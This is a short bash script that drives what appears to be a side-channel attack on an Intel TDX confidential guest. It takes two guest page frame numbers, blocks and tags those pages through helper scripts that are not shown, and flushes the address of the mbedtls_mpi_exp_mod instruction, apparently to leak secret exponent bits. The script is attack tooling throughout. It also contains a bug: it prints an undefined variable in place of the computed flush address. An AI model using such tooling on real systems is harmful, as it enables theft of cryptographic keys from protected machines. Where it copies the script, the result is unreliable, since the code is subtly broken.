#!/bin/bash
set -e

# Remove all list before setting
../../script/remove_pagelist.sh
../../script/remove_flushlist.sh

# Get PFN input for (target)
read -p "Enter guest PFN for (target) (e.g., 0x1234): " pfn_target
if [[ ! $pfn_target =~ ^0x[0-9a-fA-F]+$ ]]; then
  echo "Error: PFN for A (target) must be a valid hex value starting with '0x'."
  exit 1
fi

# Get PFN input for (start)
read -p "Enter guest PFN for (start) (e.g., 0x5678): " pfn_start
if [[ ! $pfn_start =~ ^0x[0-9a-fA-F]+$ ]]; then
  echo "Error: PFN for B (start) must be a valid hex value starting with '0x'."
  exit 1
fi

../../script/tdxblock.sh "$pfn_target"
../../script/tdxtag.sh 0 target

../../script/tdxblock.sh "$pfn_start"
../../script/tdxtag.sh 1 start

# Flush mbedtls_mpi_exp_mod (ei == 1) instruction
target_flush=$(( (pfn_target << 12) + 0x100 ))

printf "target_flush = 0x%x\n" "$target_flush1"

../../script/tdxflush.sh $(printf "0x%x" "$target_flush")




../../script/dmesg_clear.sh
echo '---------------------------------------'
../../script/print_list.sh
echo '---------------------------------------'
../../script/dmesg_clear.sh
